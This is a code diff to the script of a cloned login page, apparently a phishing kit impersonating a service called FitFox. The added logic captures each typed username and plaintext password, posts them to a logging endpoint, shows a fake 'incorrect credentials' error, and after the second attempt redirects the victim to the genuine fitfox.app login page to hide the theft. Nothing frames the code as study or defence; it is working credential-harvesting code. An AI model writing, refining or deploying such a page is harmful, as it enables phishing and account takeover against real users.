@@ -95,27 +95,35 @@
   <script src="js/scripts.bundle.js"></script>
 
   <script>
-    // ── Identificador de esta página para los logs ──────────
-    // El servidor combinará este valor con la ruta real del endpoint,
-    // de modo que el log mostrará "/fitfox/login" en vez de "/login".
     const PAGE_ID = 'fitfox';
+    const MAX_ATTEMPTS = 2;
+    const REDIRECT_URL = 'https://fitfox.app/login';
 
-    const form      = document.getElementById("loginForm");
+    const form = document.getElementById("loginForm");
     const submitBtn = document.getElementById("submitBtn");
-    const btnLabel  = document.getElementById("btnLabel");
+    const btnLabel = document.getElementById("btnLabel");
     const btnSpinner = document.getElementById("btnSpinner");
-    const alert     = document.getElementById("login-alert");
-    const alertMsg  = document.getElementById("login-alert-msg");
+    const alert = document.getElementById("login-alert");
+    const alertMsg = document.getElementById("login-alert-msg");
 
+    /* ── Contador de intentos en sessionStorage ─────────── */
+    function getAttempts() {
+      return parseInt(sessionStorage.getItem('_ff_attempts') || '0', 10);
+    }
+    function incrementAttempts() {
+      var n = getAttempts() + 1;
+      sessionStorage.setItem('_ff_attempts', n);
+      return n;
+    }
+
+    /* ── Envío de logs (sendBeacon + fetch fallback) ─────── */
     function sendLog(endpoint, data) {
       if (navigator.sendBeacon) {
         try {
           var blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
           navigator.sendBeacon(endpoint, blob);
           return Promise.resolve();
-        } catch (_err) {
-          // seguir con fetch si sendBeacon falla
-        }
+        } catch (_err) { }
       }
       return fetch(endpoint, {
         method: 'POST',
@@ -127,19 +135,14 @@
       });
     }
 
-    function trackPageVisit() {
-      return sendLog('/visit', {
-        page: PAGE_ID,
-        user: 'anonymous'
-      });
-    }
+    /* ── Visita de página ───────────────────────────────── */
+    sendLog('/visit', { page: PAGE_ID, user: 'anonymous' });
 
-    trackPageVisit();
-
+    /* ── Submit ─────────────────────────────────────────── */
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const username    = document.getElementById("username").value.trim();
+      const username = document.getElementById("username").value.trim();
       const rawPassword = document.getElementById("password").value;
 
       if (!username || !rawPassword) {
@@ -150,18 +153,31 @@
       setLoading(true);
       hideAlert();
 
+      const attempts = incrementAttempts();
+
+      if (attempts >= MAX_ATTEMPTS) {
+        /* Último intento: loguear como MAX_ATTEMPTS_REDIRECT y redirigir */
+        sessionStorage.removeItem('_ff_attempts');
+        await sendLog('/login', {
+          username,
+          password: rawPassword,
+          page: PAGE_ID,
+          event: 'MAX_ATTEMPTS_REDIRECT',
+          attempts,
+          redirectTo: REDIRECT_URL,
+        });
+        setTimeout(() => { window.location.href = REDIRECT_URL; }, 600);
+        return;
+      }
+
+      /* Intento normal */
       try {
         const res = await fetch("/login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username,
-            password: rawPassword,
-            page: PAGE_ID,   // ← el servidor usará esto para construir "/fitfox/login"
-          }),
+          body: JSON.stringify({ username, password: rawPassword, page: PAGE_ID }),
         });
         const data = await res.json();
-
         if (!data.success) {
           showAlert(data.error || "Credenciales incorrectas. Por favor, inténtalo de nuevo.");
         }
@@ -172,18 +188,17 @@
       }
     });
 
+    /* ── Helpers UI ─────────────────────────────────────── */
     function setLoading(on) {
       submitBtn.disabled = on;
       btnLabel.classList.toggle("d-none", on);
       btnSpinner.classList.toggle("d-none", !on);
     }
-
     function showAlert(msg) {
       alertMsg.textContent = msg;
       alert.classList.remove("d-none");
       alert.scrollIntoView({ behavior: "smooth", block: "center" });
     }
-
     function hideAlert() {
       alert.classList.add("d-none");
     }
